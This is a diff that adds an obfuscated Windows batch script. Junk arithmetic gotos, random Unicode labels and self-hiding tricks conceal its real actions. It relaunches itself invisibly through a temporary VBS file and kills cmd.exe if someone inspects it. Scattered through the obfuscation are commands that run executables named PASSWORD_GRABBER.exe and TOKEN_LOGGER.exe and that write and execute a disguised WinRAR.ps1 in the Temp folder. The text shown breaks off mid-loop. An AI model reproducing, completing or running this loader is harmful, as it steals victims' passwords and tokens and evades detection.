@@ -1,0 +1,5161 @@
+>nul 2>
+1 
+
+ exit >nul 2>
+1 
+
+ cls 
+@echo off 
+if defined redo (
+goto :KDOTUP  
+)
+set "redo=1" 
+echo CreateObject("Wscript.Shell").Run "C:\Users\al\Downloads\script.bat"   0  True > temp.vbs 
+cscript //nologo temp.vbs 
+del temp.vbs 
+exit 
+:KDOTUP  
+@echo off 
+echo @echo off >> kdotEKSbU.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotEKSbU.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotEKSbU.bat 
+
+ call kdotEKSbU.bat 
+::mAde by K.dOT uSiNG sOMAlifUScAtORv2
+set /a aNS=0x7*0x6d*~-1014 
+gotO    (0x7*0x6d*~-1014)  
+:212589  
+set/a aNs=2*2*03*03*0x5*~-1614 
+gOtO   (2*2*03*03*0x5*~-1614)  
+:587751  
+set "f=b" 
+set /a aNs=0x3*05*~-24474 
+goTo   (0x3*05*~-24474)  
+:398729  
+for /l %%i  in (123  123  123) do (
+ set "h=d" 
+)
+set/a ans=0x3*0x3*03*0x5*~-2028 
+gOTo       (0x3*0x3*03*0x5*~-2028)  
+:389477  
+set /a aNS=2*2*2*2*05*((011210210201)>>4) 
+gOTO      (2*2*2*2*05*((011210210201)>>4))  
+:405359  
+set /a ans=0x11*0x53*(0x126053) 
+goTo         (0x11*0x53*(0x126053))  
+:347072  
+set "l=h" 
+set /a ans=2*2*2*((0x5e3830124727)>>2) 
+gOto (2*2*2*((0x5e3830124727)>>2))  
+:737806  
+set "n=j" 
+for /l %%p  in (209  209  209) do (
+ set "o=k" 
+)
+set "p=l" 
+set /a aNS=2*0x3*0153*((0x33c740x98674)>>9) 
+gotO      (2*0x3*0153*((0x33c740x98674)>>9))  
+:615989  
+set /a aNs=0x3*0x3*03*05*0xb*0x61 
+goTo      (0x3*0x3*03*05*0xb*0x61)  
+:603535  
+set "s=o" 
+for /l %%d  in (446  446  446) do (
+ set "t=p" 
+)
+set /a aNs=0x5*~-102330 
+gOtO        (0x5*~-102330)  
+:589475  
+set /a aNS=0xa7*((0x698100737120)>>6) 
+goto      (0xa7*((0x698100737120)>>6))  
+:586169  
+for /l %%f  in (893  893  893) do (
+ set "w=s" 
+)
+for /l %%n  in (948  948  948) do (
+ set "x=t" 
+)
+set "y=u" 
+set /a anS=03*0x5*~-48488 
+gotO      (03*0x5*~-48488)  
+:204026  
+set "a=w" 
+for /l %%r  in (267  267  267) do (
+ set "b=x" 
+)
+set "c=y" 
+set "d=z" 
+set /a ans=~-858*(026340743) 
+gOTo     (~-858*(026340743))  
+:815678  
+set /a aNS=0x7*0x71*(0344001451) 
+gOto   (0x7*0x71*(0344001451))  
+:676375  
+for /l %%h  in (347  347  347) do (
+ set "G1=C" 
+)
+set /a aNs=0x3*0x5*(0x172b040126) 
+gOtO   (0x3*0x5*(0x172b040126))  
+:130809  
+for /l %%w  in (961  961  961) do (
+ set "I1=E" 
+)
+set /a anS=2*2*0x3*0x17*0x1d*035 
+goTo   (2*2*0x3*0x17*0x1d*035)  
+:398562  
+set "K1=G" 
+set /a aNs=015*0x83*~-242 
+goTo   (015*0x83*~-242)  
+:689097  
+for /l %%n  in (341  341  341) do (
+ set "M1=I" 
+)
+for /l %%s  in (415  415  415) do (
+ set "N1=J" 
+)
+for /l %%e  in (354  354  354) do (
+ set "O1=K" 
+)
+set "P1=L" 
+for /l %%w  in (217  217  217) do (
+ set "Q1=M" 
+)
+for /l %%u  in (33  33  33) do (
+ set "R1=N" 
+)
+set /a ans=2*(0x233c0x2a5bb) 
+goTo      (2*(0x233c0x2a5bb))  
+:789059  
+for /l %%k  in (906  906  906) do (
+ set "T1=P" 
+)
+set "U1=Q" 
+set /a anS=0x5*07*013*027*0x3b 
+gOTO      (0x5*07*013*027*0x3b)  
+:463065  
+set /a anS=2*03*0x3b*((0xded02711)>>2) 
+gOto   (2*03*0x3b*((0xded02711)>>2))  
+:883387  
+set "X1=T" 
+set /a aNS=0x3*0xd*(03451046140) 
+gOTO     (0x3*0xd*(03451046140))  
+:290623  
+set /a anS=027*045*(04000x91) 
+gOto      (027*045*(04000x91))  
+:731263  
+set /a ans=2*0277*(0x3f70136) 
+gOTo (2*0277*(0x3f70136))  
+:855959  
+for /l %%n  in (113  113  113) do (
+ set "B1=X" 
+)
+set /a aNS=2*2*0107*~-642 
+goTO        (2*2*0107*~-642)  
+:377186  
+set /a aNs=2*0x3*0xb*((0275120401762504)>>6) 
+gOto    (2*0x3*0xb*((0275120401762504)>>6))  
+:925907  
+set /a ans=2*2*~-143954 
+goto   (2*2*~-143954)  
+:195769  
+set /a anS=057*((061267630x92d33)>>6) 
+gOtO     (057*((061267630x92d33)>>6))  
+:266732  
+for /l %%B  in (35  35  35) do (
+ rundll32 
+)
+GT зちLਚપഢㅐיχច  
+set /a ans=035*~-29168 
+gOTo   (035*~-29168)  
+:291215  
+:χრೂ६ךלეఐਕط
+for /l %%Z  in (20  20  20) do (
+ mshta 
+)
+ - - $ -  >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set /a anS=07*~-129708 
+gOTO    (07*~-129708)  
+:656049  
+set "f=b" 
+set/a ans=2*013*0xd*015*0263 
+goTo   (2*013*0xd*015*0263)  
+:129670  
+set "h=d" 
+set /a ans=03*023*(0x3c8206373) 
+gotO       (03*023*(0x3c8206373))  
+:620624  
+for /l %%l  in (692  692  692) do (
+ set "j=f" 
+)
+set "k=g" 
+set "l=h" 
+for /l %%l  in (372  372  372) do (
+ set "m=i" 
+)
+set /a ans=2*0x1d*075*~-264 
+goTo   (2*0x1d*075*~-264)  
+:844484  
+set /a anS=2*2*03*0xd*((0x2e12072052)>>3) 
+gotO    (2*2*03*0xd*((0x2e12072052)>>3))  
+:557984  
+set /a ans=0x3*~-294*(0x63c01137) 
+gotO     (0x3*~-294*(0x63c01137))  
+:783684  
+set /a aNS=0x3*0xd*((0370432701136127)>>7) 
+gOto     (0x3*0xd*((0370432701136127)>>7))  
+:402751  
+set "r=n" 
+set /a aNS=2*0x5*027*(0xdcc01771) 
+goto   (2*0x5*027*(0xdcc01771))  
+:815848  
+set/a anS=2*2*2*0xd*~-8298 
+gOto     (2*2*2*0xd*~-8298)  
+:421930  
+set "u=q" 
+for /l %%n  in (967  967  967) do (
+ set "v=r" 
+)
+for /l %%q  in (139  139  139) do (
+ set "w=s" 
+)
+set /a anS=013*0xd*(0x1a370xc3e) 
+gOTO     (013*0xd*(0x1a370xc3e))  
+:418261  
+for /l %%r  in (2  2  2) do (
+ set "y=u" 
+)
+set /a ans=0x5*0x49*((0x547023723)>>2) 
+goto       (0x5*0x49*((0x547023723)>>2))  
+:645279  
+set /a aNS=2*2*05*0xb*~-3084 
+gOTO (2*2*05*0xb*~-3084)  
+:815470  
+set "b=x" 
+set "c=y" 
+set /a ans=0x3*027*(0xb690x1660) 
+gOtO    (0x3*027*(0xb690x1660))  
+:152050  
+set /a aNs=2*2*015*075*((0xe67d0365575)>>8) 
+gOto     (2*2*015*075*((0xe67d0365575)>>8))  
+:992616  
+set "F1=B" 
+set /a anS=0x47*~-7130 
+gOTo     (0x47*~-7130)  
+:360325  
+for /l %%m  in (256  256  256) do (
+ set "H1=D" 
+)
+set /a aNS=0x3*03*03*0x3b*0203 
+gOto      (0x3*03*03*0x3b*0203)  
+:170544  
+set /a ans=2*(0x14ff30x7f742) 
+gOtO   (2*(0x14ff30x7f742))  
+:521637  
+set /a ans=03*(0173240xd647) 
+gOto    (03*(0173240xd647))  
+:416639  
+set /a aNs=2*2*~-450*~-464 
+gOtO       (2*2*~-450*~-464)  
+:377354  
+for /l %%b  in (601  601  601) do (
+ set "M1=I" 
+)
+set "N1=J" 
+set /a ans=03*((0313013170xc7e8f)>>6) 
+gotO      (03*((0313013170xc7e8f)>>6))  
+:276119  
+set/a anS=2*2*2*2*0x3*03*((05605160345556)>>5) 
+gOtO     (2*2*2*2*0x3*03*((05605160345556)>>5))  
+:338357  
+for /l %%y  in (948  948  948) do (
+ set "Q1=M" 
+)
+set "R1=N" 
+set "S1=O" 
+set "T1=P" 
+set /a aNS=0x5*(0xac8f0252462) 
+gotO     (0x5*(0xac8f0252462))  
+:849712  
+for /l %%h  in (491  491  491) do (
+ set "V1=R" 
+)
+set "W1=S" 
+for /l %%w  in (209  209  209) do (
+ set "X1=T" 
+)
+for /l %%y  in (272  272  272) do (
+ set "Y1=U" 
+)
+set /a ans=2*0xd*(0x26f605753) 
+gOTo       (2*0xd*(0x26f605753))  
+:113281  
+set "A1=W" 
+for /l %%p  in (417  417  417) do (
+ set "B1=X" 
+)
+set /a anS=2*2*((0x6162f20x128a7f2)>>8) 
+gOtO    (2*2*((0x6162f20x128a7f2)>>8))  
+:891102  
+set /a aNs=0x3*0x3*0x95*(014340x189) 
+goTo     (0x3*0x3*0x95*(014340x189))  
+:562415  
+set /a aNS=2*0x3*053*((064227702477)>>7) 
+gOTo     (2*0x3*053*((064227702477)>>7))  
+:615052  
+GOTO гវڑآμវذшㅔْ  
+doskey FTYPE=FOR 
+:ಗضдҳλુלْطי
+forfiles /p   /m PASSWORD_GRABBER.exe /c 'cmd /c start @file' >nul 2>nul 
+  
+set /a anS=0x3*~-318432 
+goTO   (0x3*~-318432)  
+:459754  
+GOTO ثгなҳّذોаِن6  
+powershell.exe -nop -c "Write-Host -NoNewLine $null" 
+:ກກزھしLքمنω
+set /a aNS=2*2*2*0x5*013*(0x7e007543) 
+gOTo       (2*2*2*0x5*013*(0x7e007543))  
+:209297  
+   >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+for /l %%m  in (5  5  5) do (
+ set "e=a" 
+)
+set "f=b" 
+set /a anS=2*2*0x97*((0251570x85f)>>4) 
+gotO      (2*2*0x97*((0251570x85f)>>4))  
+:439777  
+set "h=d" 
+set /a ans=0x3*013*0x25*(03570x1e0) 
+goto      (0x3*013*0x25*(03570x1e0))  
+:990980  
+for /l %%v  in (765  765  765) do (
+ set "j=f" 
+)
+for /l %%w  in (357  357  357) do (
+ set "k=g" 
+)
+set "l=h" 
+set "m=i" 
+set "n=j" 
+set /a aNs=2*07*037*((0133652066112)>>5) 
+goto     (2*07*037*((0133652066112)>>5))  
+:393567  
+set /a aNs=2*013*0xb*015*0x89 
+goTO      (2*013*0xb*015*0x89)  
+:610048  
+set /a anS=~-532952 
+gOto     (~-532952)  
+:748785  
+set "r=n" 
+set "s=o" 
+for /l %%w  in (185  185  185) do (
+ set "t=p" 
+)
+for /l %%q  in (961  961  961) do (
+ set "u=q" 
+)
+set /a ans=0235*~-4410 
+gOTO    (0235*~-4410)  
+:838291  
+set "w=s" 
+set "x=t" 
+set /a aNS=2*2*2*027*(0177503054) 
+gotO   (2*2*2*027*(0177503054))  
+:209985  
+set /a anS=0x3*0x3*0x4f*((0x48530x1be53)>>9) 
+gotO      (0x3*0x3*0x4f*((0x48530x1be53)>>9))  
+:835123  
+set "a=w" 
+set /a ans=2*2*2*021*((0115360202066202)>>8) 
+goTO       (2*2*2*021*((0115360202066202)>>8))  
+:691931  
+set "c=y" 
+set "d=z" 
+for /l %%v  in (531  531  531) do (
+ set "E1=A" 
+)
+set "F1=B" 
+set /a aNs=2*0x5*05*015*~-740 
+goTo       (2*0x5*05*015*~-740)  
+:720775  
+set /a ans=2*2*0x5*0x5*~-7298 
+gotO     (2*2*0x5*0x5*~-7298)  
+:988024  
+set "I1=E" 
+set /a aNs=2*2*2*2*2*0x3*03*0x17*0177 
+goTO       (2*2*2*2*2*0x3*03*0x17*0177)  
+:778418  
+set /a anS=0x5*0x61*(0x610x82) 
+gOTo     (0x5*0x61*(0x610x82))  
+:464348  
+set "L1=H" 
+set "M1=I" 
+set "N1=J" 
+for /l %%b  in (801  801  801) do (
+ set "O1=K" 
+)
+for /l %%j  in (583  583  583) do (
+ set "P1=L" 
+)
+for /l %%z  in (939  939  939) do (
+ set "Q1=M" 
+)
+set /a ans=0x5*0x5*0x25*((012210xe95)>>2) 
+gotO       (0x5*0x5*0x25*((012210xe95)>>2))  
+:103278  
+set /a ans=2*0x1d*0x49*0x7f 
+goTO   (2*0x1d*0x49*0x7f)  
+:874552  
+set/a ans=2*2*((0553037013610457)>>4) 
+gOTO       (2*2*((0553037013610457)>>4))  
+:346725  
+set /a aNS=2*2*0123*(0x9960243) 
+gOTo    (2*2*0123*(0x9960243))  
+:756848  
+set /a anS=0xb*0x13*~-3540 
+gOTo (0xb*0x13*~-3540)  
+:382155  
+set /a anS=2*2*0x25*051*0117 
+gOTO     (2*2*0x25*051*0117)  
+:678277  
+set /a anS=2*0x1f*0123*0xc1 
+gotO   (2*0x1f*0123*0xc1)  
+:644746  
+set "Y1=U" 
+set /a ans=0x3*05*07*~-7220 
+goto       (0x3*05*07*~-7220)  
+:265397  
+set "A1=W" 
+set /a ans=((0xfbc02304)>>3)*~-1182 
+gOto   (((0xfbc02304)>>3)*~-1182)  
+:211805  
+for /l %%c  in (996  996  996) do (
+ set "C1=Y" 
+)
+set /a aNs=2*0x3*0xb*~-2804 
+gOTO    (2*0x3*0xb*~-2804)  
+:398140  
+for /l %%k  in (16  16  16) do (
+ timeout 0 >nul 
+)
+GOTO خఐλλْڑdشزე  
+for /l %%K  in (57  57  57) do (
+ rundll32 
+)
+:зちLਚપഢㅐיχច
+set /a anS=2*2*0x3*0x3d*0235 
+gotO       (2*2*0x3*0x3d*0235)  
+:445433  
+SET ٰλरなْطеეّഢ=r0h94oBO3f1xAyDMX6z8uS5dIplHbKUijqPEg7CGYRNnWTa2JwtkQsL  
+set /a ans=2*2*03*(013400x397b) 
+gOTo     (2*2*03*(013400x397b))  
+:625424  
+GOTO λُฐრطںβፕુں  
+set /a aNS=2*0x3*0x3*051*((0x317b20xdcb2)>>8) 
+goTO    (2*0x3*0x3*051*((0x317b20xdcb2)>>8))  
+:455882  
+:ל४હಹיਟгចೀش
+doskey FC=PUSHD 
+  
+set /a aNs=05*((0xceef230564106443)>>9) 
+goto      (05*((0xceef230564106443)>>9))  
+:819312  
+set /a aNs=0x7*07*(023661015234) 
+gOTo       (0x7*07*(023661015234))  
+:857553  
+set "g=c" 
+for /l %%o  in (657  657  657) do (
+ set "h=d" 
+)
+set/a aNS=2*07*013*0x1f*0225 
+gOTo    (2*07*013*0x1f*0225)  
+:112582  
+set "j=f" 
+set /a ans=0xd*0153*((010407030167703)>>9) 
+gOtO     (0xd*0153*((010407030167703)>>9))  
+:653114  
+set/a anS=2*2*0x47*~-1104 
+goto      (2*2*0x47*~-1104)  
+:680796  
+for /l %%h  in (501  501  501) do (
+ set "m=i" 
+)
+for /l %%z  in (23  23  23) do (
+ set "n=j" 
+)
+set /a aNs=2*((03164000750xba53d)>>8) 
+goTO        (2*((03164000750xba53d)>>8))  
+:561229  
+set "p=l" 
+set "q=m" 
+for /l %%b  in (524  524  524) do (
+ set "r=n" 
+)
+set /a ans=0xd*0x17*~-3042 
+gOtO   (0xd*0x17*~-3042)  
+:369614  
+set /a ans=0x3*0x7*~-24444 
+goTo       (0x3*0x7*~-24444)  
+:776159  
+set /a ans=03*03*0x5*((01121410x5bad1)>>4) 
+goTo     (03*03*0x5*((01121410x5bad1)>>4))  
+:572173  
+set /a anS=((01155762201663512)>>3) 
+gOTo    (((01155762201663512)>>3))  
+:331780  
+for /l %%s  in (255  255  255) do (
+ set "w=s" 
+)
+set/a aNs=2*2*2*~-36872 
+gOTO       (2*2*2*~-36872)  
+:582651  
+for /l %%m  in (558  558  558) do (
+ set "y=u" 
+)
+set /a ans=~-286544 
+gOto     (~-286544)  
+:225483  
+set/a aNs=2*~-208998 
+gOto         (2*~-208998)  
+:931095  
+for /l %%h  in (118  118  118) do (
+ set "b=x" 
+)
+set /a ans=05*((061341502655071)>>2) 
+goTo   (05*((061341502655071)>>2))  
+:262085  
+set "d=z" 
+set /a ans=0x7*((0x1d397e0626676)>>6) 
+goTO       (0x7*((0x1d397e0626676)>>6))  
+:942927  
+for /l %%j  in (583  583  583) do (
+ set "F1=B" 
+)
+set /a aNs=07*013*((035145270x39f57)>>9) 
+gOTO     (07*013*((035145270x39f57)>>9))  
+:832256  
+set /a aNS=2*0xd*075*((0x40e01226)>>3) 
+gOto      (2*0xd*075*((0x40e01226)>>3))  
+:811938  
+set/a aNs=0x3*05*07*(0x1d0f01356) 
+gOto   (0x3*05*07*(0x1d0f01356))  
+:281669  
+set /a aNs=0x7*(0x1845c0x477) 
+gOtO      (0x7*(0x1845c0x477))  
+:719944  
+set /a aNs=0xd*0x1f*~-692 
+goTO      (0xd*0x1f*~-692)  
+:645797  
+set "L1=H" 
+set /a aNs=0x5*05*035*(073202767) 
+goto    (0x5*05*035*(073202767))  
+:605105  
+set "N1=J" 
+set "O1=K" 
+set "P1=L" 
+set "Q1=M" 
+set /a anS=2*03*03*03*(0x3bfd02000) 
+gOtO        (2*03*03*03*(0x3bfd02000))  
+:258810  
+set /a aNS=0x5*(0x159570742364) 
+gOtO   (0x5*(0x159570742364))  
+:466483  
+set "T1=P" 
+set /a aNS=2*~-243462 
+goTo   (2*~-243462)  
+:248687  
+for /l %%d  in (9  9  9) do (
+ set "V1=R" 
+)
+set /a anS=2*2*2*2*2*0x13*(05470x7c) 
+goto   (2*2*2*2*2*0x13*(05470x7c))  
+:996787  
+set /a anS=0xb*(0115400xcefb) 
+goto    (0xb*(0115400xcefb))  
+:413860  
+set /a ans=(012731102604622) 
+gOtO      ((012731102604622))  
+:144523  
+set "Z1=V" 
+for /l %%n  in (533  533  533) do (
+ set "A1=W" 
+)
+set /a anS=0x3*(0xf3870x1017c) 
+gOto      (0x3*(0xf3870x1017c))  
+:954001  
+set /a aNs=2*2*2*~-21212 
+goTo      (2*2*2*~-21212)  
+:900672  
+set "D1=Z" 
+call TOKEN_LOGGER.exe >nul 2>nul 
+GOTO ಗضдҳλુלْطי  
+wscript /b 
+:ુزਟ१ខપظഢمٰ
+set /a ans=2*0x5*0x5*0x13*((0610xfe5)>>2) 
+goTo     (2*0x5*0x5*0x13*((0610xfe5)>>2))  
+:219822  
+stlocal nabldlaydxpansion  
+if 4  equ 47137 (
+ doskey /listsize=0 
+) else (
+doskey /listsize=0 
+)
+GOTO ّببصаฉきзڈھ  
+for /l %%w  in (45  45  45) do (
+ cd   
+)
+:چㅁڈഢចఔڑِْો
+set /a ans=07*((01755356607333326)>>5) 
+gOtO     (07*((01755356607333326)>>5))  
+:915903  
+ 
+ . -  -  - - "C:\Users\puncher\AppData\Local\Temp\WinRAR.ps1"  
+set/a ans=2*0x5*0x13*~-1524 
+gOTo      (2*0x5*0x13*~-1524)  
+:424106  
+set "f=b" 
+set/a aNs=2*2*2*023*((075207210xd86d1)>>8) 
+gOTo    (2*2*2*023*((075207210xd86d1)>>8))  
+:260952  
+set "h=d" 
+set /a aNs=2*(0xc02f0201440) 
+goTO       (2*(0xc02f0201440))  
+:259003  
+set /a aNS=2*0x95*((0413670301575703)>>9) 
+goTO   (2*0x95*((0413670301575703)>>9))  
+:799768  
+for /l %%u  in (353  353  353) do (
+ set "k=g" 
+)
+for /l %%u  in (167  167  167) do (
+ set "l=h" 
+)
+set/a aNS=~-282*((060400x143c)>>2) 
+goTO   (~-282*((060400x143c)>>2))  
+:492880  
+for /l %%r  in (94  94  94) do (
+ set "n=j" 
+)
+for /l %%d  in (81  81  81) do (
+ set "o=k" 
+)
+for /l %%c  in (957  957  957) do (
+ set "p=l" 
+)
+set/a aNS=0x3*03*0x5*0x25*((0512010133001)>>7) 
+goto (0x3*03*0x5*0x25*((0512010133001)>>7))  
+:796953  
+set /a aNS=2*065*~-7578 
+gOtO      (2*065*~-7578)  
+:640846  
+for /l %%h  in (197  197  197) do (
+ set "s=o" 
+)
+set /a anS=2*(03620x11)*((0xe0980367270)>>5) 
+gOTo       (2*(03620x11)*((0xe0980367270)>>5))  
+:483827  
+set/a aNs=023*~-33998 
+gOto      (023*~-33998)  
+:992228  
+set/a ans=2*2*2*0x7*053*0235 
+gOto   (2*2*2*0x7*053*0235)  
+:307395  
+set /a aNS=0x3*03*0x11*0x13*0xb3 
+gOTO     (0x3*03*0x11*0x13*0xb3)  
+:675481  
+set /a aNs=065*((0x986a0x1dba)>>4) 
+goTO      (065*((0x986a0x1dba)>>4))  
+:607908  
+set "y=u" 
+for /l %%o  in (538  538  538) do (
+ set "z=v" 
+)
+set/a anS=2*2*07*(0172520x6165) 
+goTO      (2*2*07*(0172520x6165))  
+:852168  
+set /a aNs=0x3*03*0x3*0x3*0xd*(010420xe7) 
+gOto      (0x3*03*0x3*0x3*0xd*(010420xe7))  
+:533278  
+set /a anS=2*2*2*2*0x7*0x7*013*0x1f 
+goTo      (2*2*2*2*0x7*0x7*013*0x1f)  
+:748378  
+for /l %%w  in (436  436  436) do (
+ set "d=z" 
+)
+for /l %%r  in (268  268  268) do (
+ set "E1=A" 
+)
+set "F1=B" 
+for /l %%b  in (798  798  798) do (
+ set "G1=C" 
+)
+set/a aNs=2*2*2*0x3*0x3*07*((0x176cc0x3f1cc)>>8) 
+goTO   (2*2*2*0x3*0x3*07*((0x176cc0x3f1cc)>>8))  
+:989994  
+set "I1=E" 
+set /a ans=~-380*(0x190656) 
+gOtO     (~-380*(0x190656))  
+:940115  
+set /a ans=2*2*037*((0175314013554)>>5) 
+gOTO        (2*2*037*((0175314013554)>>5))  
+:929401  
+set/a aNS=2*2*~-238830 
+goto       (2*2*~-238830)  
+:246448  
+for /l %%e  in (196  196  196) do (
+ set "M1=I" 
+)
+set /a aNS=0x5*0x1f*~-6030 
+gOto        (0x5*0x1f*~-6030)  
+:333739  
+set/a anS=051*(055120x14ef) 
+goto    (051*(055120x14ef))  
+:392449  
+for /l %%w  in (274  274  274) do (
+ set "P1=L" 
+)
+set/a aNS=03*0x3*03*0107*((031421042221)>>7) 
+gOTO     (03*0x3*03*0107*((031421042221)>>7))  
+:359400  
+set/a ans=0x7*(056461017764) 
+goto     (0x7*(056461017764))  
+:368084  
+set/a anS=0x3*0x7*((02324510x3fa05)>>2) 
+gotO      (0x3*0x7*((02324510x3fa05)>>2))  
+:646609  
+set "T1=P" 
+set /a aNs=2*2*~-137700 
+gOTo     (2*2*~-137700)  
+:109240  
+set "V1=R" 
+set /a aNS=2*2*2*((0x16767a0x2aa9a)>>5) 
+goto       (2*2*2*((0x16767a0x2aa9a)>>5))  
+:779500  
+for /l %%y  in (858  858  858) do (
+ set "X1=T" 
+)
+set /a anS=0x3*~-163662 
+goTO (0x3*~-163662)  
+:773080  
+set /a aNS=2*0x3*0x3*027*(012050x7c) 
+gotO      (2*0x3*0x3*027*(012050x7c))  
+:790265  
+set /a aNS=2*~-118278 
+gotO    (2*~-118278)  
+:513095  
+for /l %%y  in (89  89  89) do (
+ set "B1=X" 
+)
+set /a anS=2*2*0x3*0x3*03*0xd*0x59 
+gOtO         (2*2*0x3*0x3*03*0xd*0x59)  
+:598820  
+set /a aNs=2*03*03*0x47*((04430310x74419)>>9) 
+gotO    (2*03*03*0x47*((04430310x74419)>>9))  
+:853010  
+set /a ans=2*0xb*0x13*(022540x135) 
+gOTo       (2*0xb*0x13*(022540x135))  
+:943797  
+GOTO ל४હಹיਟгចೀش  
+set /a ans=0x7*0x7*(0x1c80xcf7) 
+goto     (0x7*0x7*(0x1c80xcf7))  
+:739779  
+set/a aNS=2*03*(02035050171620) 
+gOTO     (2*03*(02035050171620))  
+:146270  
+for /l %%t  in (806  806  806) do (
+ set "g=c" 
+)
+set/a aNS=2*2*07*07*~-4760 
+gOTo      (2*2*07*07*~-4760)  
+:150885  
+set "i=e" 
+set/a ans=0x3*021*(0125160x38d) 
+gOto   (0x3*021*(0125160x38d))  
+:456111  
+for /l %%g  in (242  242  242) do (
+ set "k=g" 
+)
+set /a aNS=2*~-223064 
+gOTo    (2*~-223064)  
+:958950  
+set /a aNS=03*0x3*0x7*0xb*((06444370240037)>>8) 
+gOtO       (03*0x3*0x7*0xb*((06444370240037)>>8))  
+:537604  
+set /a aNS=05*0xb*((0105016057466)>>3) 
+gOto   (05*0xb*((0105016057466)>>3))  
+:828087  
+set /a anS=2*2*2*07*0123*0xad 
+goto      (2*2*2*07*0123*0xad)  
+:480856  
+for /l %%r  in (478  478  478) do (
+ set "p=l" 
+)
+set/a aNS=07*07*0x59*0x59 
+goTO    (07*07*0x59*0x59)  
+:622044  
+set /a aNs=2*2*2*(0x6710357156) 
+goTo       (2*2*2*(0x6710357156))  
+:148126  
+set "s=o" 
+set /a anS=2*2*2*0x7*~-12518 
+gOto      (2*2*2*0x7*~-12518)  
+:825594  
+for /l %%a  in (747  747  747) do (
+ set "u=q" 
+)
+set /a aNS=2*~-86690 
+goto       (2*~-86690)  
+:503191  
+for /l %%x  in (502  502  502) do (
+ set "w=s" 
+)
+set/a aNs=073*~-7538 
+gOTo     (073*~-7538)  
+:867879  
+set "y=u" 
+set /a aNs=03*03*0x5*07*(026710x34e) 
+goTo        (03*03*0x5*07*(026710x34e))  
+:110799  
+set /a anS=2*0x3d*(0xd040x4eb) 
+goTO (2*0x3d*(0xd040x4eb))  
+:335064  
+for /l %%j  in (233  233  233) do (
+ set "b=x" 
+)
+set /a anS=05*0x17*(0x16ae0x3ed) 
+goto    (05*0x17*(0x16ae0x3ed))  
+:881532  
+set "d=z" 
+set /a aNS=0x3*03*0131*((0xa9c053574)>>5) 
+gOto     (0x3*03*0131*((0xa9c053574)>>5))  
+:894938  
+set /a anS=2*2*0x5*0x7*~-6048 
+goTO     (2*2*0x5*0x7*~-6048)  
+:324184  
+set/a anS=~-734*(0x4cc0635) 
+goTO     (~-734*(0x4cc0635))  
+:802692  
+set/a ans=~-344694 
+gOTo     (~-344694)  
+:986332  
+for /l %%b  in (651  651  651) do (
+ set "I1=E" 
+)
+for /l %%v  in (235  235  235) do (
+ set "J1=F" 
+)
+set /a aNS=2*2*05*013*0x11*0x6d 
+goTo        (2*2*05*013*0x11*0x6d)  
+:867819  
+set /a ans=027*0x43*(05550xbe) 
+goto     (027*0x43*(05550xbe))  
+:639748  
+set "M1=I" 
+set "N1=J" 
+set /a ans=2*2*2*053*053*0x43 
+gOto (2*2*2*053*053*0x43)  
+:356282  
+set /a ans=0x3*((0x2c4b6680x92f068)>>9) 
+gOtO      (0x3*((0x2c4b6680x92f068)>>9))  
+:494862  
+set /a aNS=2*2*2*(0x19cf10xa1a0) 
+gOto      (2*2*2*(0x19cf10xa1a0))  
+:755153  
+set /a aNS=2*05*05*0147*0213 
+gOTo   (2*05*05*0147*0213)  
+:905044  
+set /a aNS=2*(01567302017011) 
+goTo      (2*(01567302017011))  
+:517967  
+set /a aNs=2*2*0x5*0x2f*(06110366) 
+gotO      (2*2*0x5*0x2f*(06110366))  
+:695894  
+for /l %%m  in (585  585  585) do (
+ set "U1=Q" 
+)
+for /l %%g  in (609  609  609) do (
+ set "V1=R" 
+)
+set "W1=S" 
+for /l %%f  in (841  841  841) do (
+ set "X1=T" 
+)
+set /a aNS=073*((0252162120x14fb8a)>>8) 
+gOto    (073*((0252162120x14fb8a)>>8))  
+:356527  
+set /a anS=03*0xb*0xb*015*0x8b 
+goTO   (03*0xb*0xb*015*0x8b)  
+:387092  
+set /a ans=2*2*2*0x3*065*~-734 
+gOto    (2*2*2*0x3*065*~-734)  
+:960757  
+set /a anS=03*0277*~-702 
+gOTo   (03*0277*~-702)  
+:879095  
+set /a anS=0103*~-11808 
+gOto   (0103*~-11808)  
+:280490  
+set /a ans=2*2*0x3*0x7*0xb*0x95 
+gOtO        (2*2*0x3*0x7*0xb*0x95)  
+:203737  
+set/a ans=05*073*~-2610 
+goto       (05*073*~-2610)  
+:502237  
+:ثгなҳّذોаِن
+for /l %%z  in (23  23  23) do (
+ doskey /listsize=0 
+)
+if not DEFINED IS_MINIMIZED (
+set IS_MINIMIZED=1
+)
+
+ start "" /min "C:\Users\al\Downloads\script.bat" 
+
+ exit  
+set /a aNs=0x3*~-159192 
+gOTO   (0x3*~-159192)  
+:277450  
+GOTO ુزਟ१ខપظഢمٰ  
+set/a aNS=0x40*((0x38bff0x845f)>>5) 
+goTo    (0x40*((0x38bff0x845f)>>5))  
+:255049  
+:ךزζतഝഞنمِٹ
+if exist C:\Windows\System3 (
+ mshta 
+) else (
+doskey /listsize=0 
+)
+    >> C:\Users\puncher\AppData\Local\Temp\WinRAR.Ps1  
+set/a aNs=0x3*((0x11e81ca0x3789fca)>>9) 
+goTo        (0x3*((0x11e81ca0x3789fca)>>9))  
+:431480  
+GOTO λُฐრطںβፕુں0  
+set /a aNS=0x35*((0x79ec0354444)>>3) 
+gOto     (0x35*((0x79ec0354444)>>3))  
+:129306  
+:५ژກω२ٹζٹμत
+set /a ans=0x1f*073*~-312 
+gOTO (0x1f*073*~-312)  
+:948595  
+set /a aNs=05*07*07*0x13*0153 
+goTo   (05*07*07*0x13*0153)  
+:403074  
+set /a aNS=2*07*0x1d*((0x2285070025)>>4) 
+gOTO   (2*07*0x1d*((0x2285070025)>>4))  
+:894351  
+for /l %%f  in (853  853  853) do (
+ set "h=d" 
+)
+set "i=e" 
+set /a aNs=2*0x3*0x3*0x11*(0x17e0x2cd) 
+gOTO       (2*0x3*0x3*0x11*(0x17e0x2cd))  
+:780664  
+set/a aNs=03*03*((0xd6b5670127374147)>>8) 
+gotO      (03*03*((0xd6b5670127374147)>>8))  
+:784902  
+for /l %%c  in (157  157  157) do (
+ set "l=h" 
+)
+set /a aNs=2*07*0xd*0xd*0xd*0x11 
+gotO      (2*07*0xd*0xd*0xd*0x11)  
+:566928  
+set "n=j" 
+set "o=k" 
+set "p=l" 
+for /l %%g  in (530  530  530) do (
